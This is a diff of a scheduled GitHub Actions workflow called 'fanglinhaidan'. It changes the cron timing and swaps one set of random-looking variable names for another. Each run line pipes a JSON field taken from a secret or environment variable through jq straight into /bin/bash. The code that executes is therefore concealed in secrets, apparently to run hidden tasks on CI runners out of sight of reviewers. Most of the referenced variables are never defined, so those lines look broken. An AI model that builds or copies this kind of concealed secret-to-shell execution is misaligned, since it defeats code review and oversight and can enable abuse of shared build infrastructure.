@@ -1,10 +1,8 @@
 name: fanglinhaidan
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 2/6 * * *'
-
+    - cron: '13 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,12 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: fanglinhaidan
         env:
-          his0051: ${{ secrets.his0051 }}
+          sklnk6: ${{ secrets.sklnk6 }}
         run: |
-          echo $his0051 | jq -r .px8397 | /bin/bash
-          echo $cpmn90 | jq -r .r7337 | /bin/bash
-          echo $ezfuv56 | jq -r .hcneo26737 | /bin/bash
-          echo $n69811 | jq -r .vm15 | /bin/bash
-          echo $d9 | jq -r .cdt98559 | /bin/bash
-          echo $dknk9352 | jq -r .kylof474 | /bin/bash
+          echo $sklnk6 | jq -r .thn058 | /bin/bash
+          echo $lb5 | jq -r .j0946 | /bin/bash
+          echo $t9 | jq -r .k85 | /bin/bash
+          echo $d0750 | jq -r .i59 | /bin/bash
+          echo $qugvu2 | jq -r .rhfmc1 | /bin/bash
+          echo $epyp72 | jq -r .q290 | /bin/bash
+          echo $lui127 | jq -r .vzc539 | /bin/bash
 
